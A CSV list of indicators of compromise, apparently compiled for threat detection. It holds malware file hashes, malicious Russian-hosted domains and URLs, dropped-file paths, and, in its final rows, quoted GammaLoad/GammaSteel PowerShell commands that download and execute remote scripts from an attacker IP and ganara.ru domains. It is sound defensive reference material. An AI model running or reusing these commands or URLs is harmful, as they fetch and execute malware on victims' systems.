Attack / Operation / Campaign,Year of attack,IoC Class,IoC Type,IoC Subtype,Indicator,Source of info
,2021,Host,File,File hash SHA256,c66ce9f228c9065a90b22bd71363a81d1a8f1d26eb5fe3815046eb42b72c0d5f,https://analyze.intezer.com/analyses/945fe75b-74ec-4ee2-9d64-27387f4d912f
,2021,Host,File,File hash SHA256,36ed18f16e5d279ec11da50bd4f0024edc234cccbd8a21e76abcfc44e2d08ff2,https://analyze.intezer.com/analyses/732b7ef1-29b1-4c76-87fd-27ca6822d585
,2021,Host,File,File hash SHA256,61e67302a85ff98eabc589572dbf3bf6e1012207d399b9f2b6b38527833e9198,https://analyze.intezer.com/analyses/8e264513-5a56-4781-87c8-941abf7f0a01
,2021,Host,File,File hash SHA256,9725f83e80c813dffd29d5162f8d3800a3f34abc1e09bea7425aa55ee9e36561,https://analyze.intezer.com/analyses/d0db4bc3-ade0-41a9-8fe8-15565add8ad9
,2021,Host,File,File hash SHA256,182ec5f3859a78ce0c42995ecf63a0e412ff189b02b57a20057d2886a9098d88,https://analyze.intezer.com/analyses/b52851ac-aa15-45f9-87c2-4114629109b1
,2022,Network,IP address,,a0705880.xsph.ru:141.8.197.42,https://www.virustotal.com/gui/url/85683b62a5f1281716d361d60340c73b041ddad903cde354571ce34625383b7e
,2022,Host,File,File hash SHA256,fbde9b7aa55e866e1d64442f136ac4f605e0178b674a5e1d5ccf2808ee1c2999,https://analyze.intezer.com/analyses/e8dc9270-4527-4cde-a983-0e6290d8834f
,2022,Host,File,File hash SHA256,e56254b6b78f0bdc82cddff15c49f5b56ffef9aa105f1aae435504d1cdfe3310,https://analyze.intezer.com/analyses/9930dfb5-3d7b-4a4e-9abc-aa05b0041f7b
,2022,Host,File,File hash SHA256,49005a01e22fefdf05bf73895884258b1f90f35b041563368683910fa5acb199,https://analyze.intezer.com/analyses/138e9c88-6a4d-4400-8054-597d70a25e01
,2022,Host,File,File hash SHA256,f8dcd730cd06b18dc109473b7dac83c4f74f5c0c864cecc80bbf9e8bae974d8e,https://analyze.intezer.com/analyses/ae9692ce-2752-4857-9425-c40da0052b51
,2022,Host,File,File hash SHA256,4a1501eef94c1db03407130afebcaddd9cf7cf1f458636c6390640400a537d59,https://analyze.intezer.com/analyses/386643be-cea4-40bb-80ed-d97b0bf06ce3
,2022,Network,URL,,https://edit-document.ru/never/days.pdf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,File hash SHA256,8a9f45e819513fd02aa0521aea3a0d85490c91523227b130d7ff08d12b8820ae,https://analyze.intezer.com/analyses/32c28b4e-e9b9-4251-9905-4e86872c6204
,2022,Host,File,File hash SHA256,765081b7cab88b3285da08bf7ec775f066fb5ba7751dd6b316adedee08797b45,https://analyze.intezer.com/analyses/e21fb295-0b03-4fb8-9bf2-804d57e37d7d
,2022,Host,File,File hash SHA256,b67cadcaf8288d38529af6b6b2e4dc911fe18252decfa484474d26774de6cd62,https://analyze.intezer.com/analyses/409c6a54-d93a-407e-a67f-bbbb71288504
,2022,Network,URL,,https://state-cip.org/10.11/sense.rtf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Network,URL,,state-cip.org:141.8.192.169,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Network,URL,,http://a0711854.xsph.ru/send/prepared.pdf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Network,URL,,hilr.ru,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
,2022,Network,URL,,https://hilr.ru/21.10/debate.rtf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,File hash SHA256,e304f806017c48f53ca5e2298157c84641e457b5749162c9a5f7f5f881e4c0eb,https://analyze.intezer.com/analyses/6a3c9ef4-c878-48d9-84e8-172df0f7c6f9
,2022,Host,File,File hash SHA256,ac8127ea235b0157d61c02e82eeb68ab75f5dc0507ed4855b2dad2939fed2aba,https://analyze.intezer.com/analyses/1a65e4a6-654d-48d4-b2d5-c15169bf2b1e
,2022,,,,d6d85de97af836701ccb59c14dfd839ee0bc1a6eafaca308d2d9782a4a6c8658,https://analyze.intezer.com/analyses/1b766cb1-6216-472c-8336-ed4896337da9
,2022,Host,File,File hash SHA256,92a3ce570dedfa12703e290b9ad77ac0568f0816332e511380dec1690a1faea0,https://analyze.intezer.com/analyses/b493d582-61e3-45fa-a997-69cfd3f9adf1
,2022,Host,File,File hash SHA256,4df592a5d994eb190c3dfc1a2876b92df20b23c99d6f6fb714b91696210a00a3,https://analyze.intezer.com/analyses/437b2e06-7670-41f0-b954-a717faa8af6b
,2022,Host,File,File hash SHA256,e9b1c833999acd1797c1d27fc87cdfe1265bc40513d6b625c24d78e44bc32970,https://analyze.intezer.com/analyses/406facd1-105e-4da9-b35d-5c18ccb0a9e8
,2022,Host,File,File hash SHA256,7b02d7d43fc670c4b02308de03aacbd1a95b577e722b34cadf58237030d07b42,https://analyze.intezer.com/analyses/8a64dd36-69b8-4059-a848-8b02f010af40
,2022,Host,File,File hash SHA256,9bf3c0ceb6be22fafe04f4ae018174fe603d952025b9a00338d68aefac52480a,https://analyze.intezer.com/analyses/1b8cfe3a-f350-407a-b176-c13b9696f505
,2022,Host,File,File hash SHA256,f119cc4cb5a7972bdc80548982b2b63fac5b48d5fce1517270db67c858e9e8b0,https://analyze.intezer.com/analyses/5d912826-e352-4d74-bae4-b3e11110ecc0
,2021,Host,File,File hash SHA256,19d03a25af5b71e859561ff8ccc0a073acb9c61b987bdb28395339f72baf46b4,https://analyze.intezer.com/analyses/c5d2e3f7-e388-4f72-84ea-327097815b70
,2022,Host,File,File hash SHA256,4c92057965c17755edad03110fbd7762c938ebdc92531575f919f9790939488e,https://analyze.intezer.com/analyses/4369a386-1111-4810-a167-97dafd3ce4ab
,2022,Host,File,File hash SHA256,53f472e9a3d3471a76f13d12417229d23efd11b047353db8b71793feacafb029,https://analyze.intezer.com/analyses/96aed59d-b481-4ff9-bf74-d098c0006219
,2021,Host,File,File hash SHA256,fe3141950fe263f50edd8a202fe746dac736dcef91331cd4375d3ede27d5530a,https://analyze.intezer.com/analyses/f5b1abd4-e90b-4c83-9450-25d44c360c59
,2022,Host,File,File hash SHA256,5a8703f237c1ad6e4ecf8dd21db0ff9b7ca746cc1aae98af4a091d73a1d92e8b,https://analyze.intezer.com/analyses/65707226-9bcb-44d6-8107-0951caa771cf
,2022,Host,File,File hash SHA256,3dc703eb1eef7f065b567b0fbc00e59792c21ebfcd8e86d9a92e5969786ad99f,https://analyze.intezer.com/analyses/4539abe3-5858-4ce9-a988-4b0534e3fe6f
,2022,Host,File,File hash SHA256,53f01a60bcea5a94207cf10d470fccd8ff7785e8a5800e640711697fdc880847,https://analyze.intezer.com/analyses/23bcb325-d1f7-4bde-a7bf-51f76b902264
,2022,Host,File,File hash SHA256,f4cff6815a66f2aa64d2495b35585925a27964699d603106de99cb7284bf804d,https://analyze.intezer.com/analyses/194ff9c1-8563-44da-a759-50655dc7d847
,2022,Host,File,File hash SHA256,60539634489764d9e590433ef632727aa465075befcb4f2d4f60405c0f8e600c,https://analyze.intezer.com/analyses/0187f694-d484-4756-9505-c146fab71b4a
,2022,Host,File,File hash SHA256,731bd088b6413d90c43ba71d41a6c15f0daa06e8acdd6fb7fe0f6a7d12ca7b61,https://analyze.intezer.com/analyses/5afe2e6a-8a63-40fd-a3a7-c7633b364503
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{80B6A73F-2A8E-42E2-BE07-6A2FEF670335}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~$e9761cbe7a0d13480c8422.doc,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{701D075F-B6EE-46EF-8359-6651CD12D304}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSD-{61F26ED7-BDFC-4157-B586-BEED9147AB9D}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{15EE7E57-A5F9-4A9A-BE98-6F23C9A36E49}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.MSO\1C857FE2.jpeg,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{98B3B2F6-8463-44A2-9376-25295311FD41},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\mso7C0C.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{E31D5688-B424-4385-AB93-0262A8D50595},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,File hash SHA256,704a6ade1ad9ccb52ff52ae86ca0bce068f14134bd4f1ab6f7506b3f201ba55b,https://analyze.intezer.com/analyses/f42b440d-14bc-4de7-8fb0-baf4f5fd87e6
,2022,Host,File,File hash SHA256,5f4926f163a6e54fb9285f263c1abd23b3e32378c64b68a033070039b2bfa8b6,https://analyze.intezer.com/analyses/791ecf0c-febe-4cc1-95b8-aef2f32b958f
,2022,Host,File,File hash SHA256,7c2c376300c1fc562521196458c2594edac152f1ad944c517927b5a12193980c,https://analyze.intezer.com/analyses/5f5bc120-e4f1-47c4-bddf-13264df8d5f7
,2022,Host,File,File hash SHA256,7e67d339ef20b288401a5caae6133a7e769f4d8a5fd87daf3331b6e6de26ed1d,https://analyze.intezer.com/analyses/bc4f3525-5d6c-448c-bd10-2c4232d75007
,2022,Host,File,File hash SHA256,c8e9761cbe7a0d13480c8422cb79fc898e4a0be7d373eb6c155842398ca480d8,https://analyze.intezer.com/analyses/d95e9721-8c83-4838-8818-877fed6840e8
,2022,Host,File,File hash SHA256,89db442ddbd539064331f32fa8e78f98d101352e1969389a9e91b543ff69a542,https://analyze.intezer.com/analyses/80855d5a-c961-487e-9435-639073851dee
,2022,Host,File,File hash SHA256,e98aa43da7228cbc01a1c4d04e11aff07eac596704e34542dfbf5fc5c645b548,https://analyze.intezer.com/analyses/1e428aa8-f0d8-41fd-b036-cded5ada1b27
,2022,Host,File,File hash SHA256,74ef9e9a9e11a7e3a95d5689a8479b2c232ba8ff3fc19cf4b78dada092876f66,https://analyze.intezer.com/analyses/6e51cd2a-7a35-4346-8a4b-050bd7b793ce
,2022,Network,URL,,a0671808.xsph.ru,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Network,URL,,http://a0671808.xsph.ru/basic/header.xml,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,File hash SHA256,782a8cc34746ca1ffc7cd83a9cc4cd64c60de2e69622a06d2a01792df2e2573c,https://analyze.intezer.com/analyses/bf7d0029-9a76-44a4-928e-728586fd6840
,2022,Host,File,File hash SHA256,88aed5172c3c225020d97d60b34e815c8883a29a7adf4a19df6680ad5c3c8897,https://analyze.intezer.com/analyses/4f5a9790-e5cd-4d54-9e5e-e11a5f0daf8c
,2022,Host,File,File hash SHA256,d85440a14ec70f5ecf05d765f4e513a97599ea9868e2e8e9568fb4ad21e1163f,https://analyze.intezer.com/analyses/3eae6daf-46df-49cd-a56d-f104c7f402a1
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{0D7F409D-D88B-4C14-9E02-7436B5E8CBA9},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{E5CE7CAA-66DC-46AA-B755-A5705AF16FA2},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~$df663e7ad9f3c4f16aa0cf.doc,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{15DAD1F3-E909-4D5E-8C70-B281D21DEB62}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRF{E029169A-48DF-4411-B84D-0573CC452AB1}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
,2022,Host,File,File hash SHA256,2cf0408ed2819bbdb36b2fd113c64339ceee893dce971e723de3d01a3e3dadbb,https://analyze.intezer.com/analyses/2543b606-0520-4e77-81e6-67f594da789d
,2022,Host,File,File hash SHA256,a123c8bc9bb6a7254764aa69928d2fec6784493eb5904683636b369507124710,https://analyze.intezer.com/analyses/27c13bf0-f8d9-4360-9895-1619a34510c8
,2022,Host,File,File hash SHA256,043d696c2199d61ee0a09be93e387498c6a53188c3e3ec20acfeccc9c9aeb251,https://analyze.intezer.com/analyses/69c1edaa-623c-41fd-a135-b52a37397961
,2022,Host,File,File hash SHA256,029005b595c5b9f3c7ddb49883b325f8f0bf5d13b18010a38d04b15f227d2052,https://analyze.intezer.com/analyses/4c134d84-c782-4850-8503-4d5114868f74
,2022,Host,File,File hash SHA256,f211e0eb49990edbb5de2bcf2f573ea6a0b6f3549e772fd16bf7cc214d924824,https://analyze.intezer.com/analyses/bb24a5d5-4f8a-442d-89b6-bf9932149d6b
,2022,Host,File,File hash SHA256,72086e3e2992e60f2fdd35049653478db397cad5b81c59789ce0aae0590ce78b,https://analyze.intezer.com/analyses/3839e176-33a5-426f-a76c-47327844eeeb
,2022,Host,File,File hash SHA256,bda512a34622dac188d6b93caad4d8e3667e4f6b1e9078d259ccea6f988c2320,https://analyze.intezer.com/analyses/3839e176-33a5-426f-a76c-47327844eeeb
,2022,Host,File,File hash SHA256,ffb6d57d789d418ff1beb56111cc167276402a0059872236fa4d46bdfe1c0a13,https://analyze.intezer.com/analyses/0bd0ae47-5832-4ef4-abc9-65727370bb33
,2022,Host,File,File hash SHA256,884c15502dbd6fe6dd4fca322904a38bce117ab6ed102ab2da84dfb4064c3e44,https://analyze.intezer.com/analyses/4c42ba9c-8029-4dea-9dca-1c50bab723a7
,2022,Host,File,File hash SHA256,e4d309735f5326a193844772fc65b186fd673436efab7c6fed9eb7e3d01b6f19,https://analyze.intezer.com/analyses/86ca7a41-5d10-454d-a616-fffa21793d6d
,2022,Host,File,File hash SHA256,7fb37a7ef155120320dbf63f781af32cc2c8db3e590c7472a44fe84d4128f3ec,https://analyze.intezer.com/analyses/ae5469c8-3b8e-4c75-a8c8-5c15639e09bf
,2022,Host,File,File hash SHA256,df70346afd410d3ba26eeeb0194fc7e6d427bfafef9a34b9efd49936ca9e273b,https://analyze.intezer.com/analyses/e8d7d8fa-6edc-4f8d-9411-9f0f34683ba2
,2022,Host,File,File hash SHA256,7c7c8548b7657c34e2b654919edbe848d460ab93630021e8e9743f8204cb0c76,https://analyze.intezer.com/analyses/385fc80d-3ea2-4942-9907-9e4130276e03
,2022,Host,File,File hash SHA256,3aac1c049eb628e1c289d3fc3a209f9262ed4cef862a3e2157bd6f3b02cc4698,https://analyze.intezer.com/analyses/9d183474-3981-41b7-b987-0cafd4bffeb1
,2022,Host,File,File hash SHA256,96b9a11f2b4f8051083643da6bdc9e3952a91ad3f882cde2e4a8910726ffc09c,https://analyze.intezer.com/analyses/ff34f30b-f869-4119-ae2a-616633eebaf8
,2022,Host,File,File hash SHA256,652d9bc90cc1833f667508c7f794237a0945c875c61370e54c73073ba27e7c85,https://analyze.intezer.com/analyses/3ee5db46-2617-477a-b2c5-cad8d7d5f772
,2022,Host,File,File hash SHA256,afcbaae700e1779d3e0abe52bf0f085945fc9b6935f7105706b1ab4a823f565f,https://analyze.intezer.com/analyses/b2b5b126-185f-495e-85cd-ac15d57cd430
,2022,Host,File,File hash SHA256,84e80cbe5e3b8c0f8cde4fcd1c72551f57c46334fcdb49c90eb8ff1b942d1438,https://analyze.intezer.com/analyses/fabe71aa-f0b8-464c-8b97-5183126e16fb
,2022,Host,File,File hash SHA256,d93551a9fa3ad9bdbb0f10dd447046e03a29bbb36245ac4245b80d982a78a930,https://analyze.intezer.com/analyses/e9b9809e-58ee-49af-8d93-32372a5a9b6a
,2022,Host,File,File hash SHA256,2da473d1f510d0ddbae074a6c13953863c25be479acedc899c5529ec55bd2a65,https://analyze.intezer.com/analyses/e78ece65-b3f5-4364-b1e4-c7f7fdeb5ac1
,2022,Host,File,File hash SHA256,0fb55f55ffca9927472f7ada8fdd9d84bc57108860be0f1c737d5111d3020b5a,https://analyze.intezer.com/analyses/55f72a27-d563-462b-9cd0-f0c485de7e11
,2022,Host,File,File hash SHA256,280a55919e502ecb66082107374e5b71a534338a8a7c02680cc4f1f84a204d59,https://analyze.intezer.com/analyses/ca8de1a1-23ba-421c-8d7c-accfa92004c9
,2022,Host,File,File hash SHA256,352b5ec506823ffc008e7b71b2968a282ea6ac08cf372ac23cc87d957ecbd889,https://analyze.intezer.com/analyses/da952da1-a7cc-4232-9b17-933aa20b14a1
,2022,Host,File,File hash SHA256,535f533b1008a55c89cab7f4d4163e609d0d6e5b512002022d2634e74e84edf9,https://analyze.intezer.com/analyses/3783a9c7-eedb-4425-b2d4-a50a982dc5cb
,2022,Host,File,File hash SHA256,74cb6c1c644972298471bff286c310e48f6b35c88b5908dbddfa163c85debdee,https://analyze.intezer.com/analyses/e134021b-7e06-4521-b5e5-b9ff1a2925a4
,2022,Host,File,File hash SHA256,283937afa83ac2bfc38f8bb3478704ae65f372b52809def5782a697d1dbf4fd3,https://analyze.intezer.com/analyses/953f5f19-7567-4975-9582-2503b546b9d3
,2022,Host,File,File hash SHA256,8762522851f33de2707725cd7a89879c0b0afbd32bd34e2ac4443e4cbf285640,https://analyze.intezer.com/analyses/7453946c-79a0-4535-ba68-91c4a00374aa
,2022,Host,File,File hash SHA256,a60df90504735f4e424ec0842e328181d7e93ac9ecd8193e892584871643bec7,https://analyze.intezer.com/analyses/5fa28d24-febe-4854-a9f6-f131a5cc2411
,2022,Host,File,File hash SHA256,96ce576f383584e0a62225a91bb50fc7fd8efa068443c4785373c86f51d2e3eb,https://analyze.intezer.com/analyses/2c8e07a6-eb46-4543-916f-4de5d6b71f23
"GammaLoad, GammaSteel",2022,Host,File,Parent folder,C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,File,Parent folder,%USERPROFILE%\,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,File,Parent folder,C:\Windows\System32\Tasks\,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nologo iex (iex (get-content .\creditcard.session | out-string)),https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $aaa = (New-Object system.Net.WebClient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa;,https://cert.gov.ua/article/1229152
"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::WriteAllText($($env:USERPROFILE+'\index.php') $tmp); iEx(IeX $tmp),https://cert.gov.ua/article/1229152
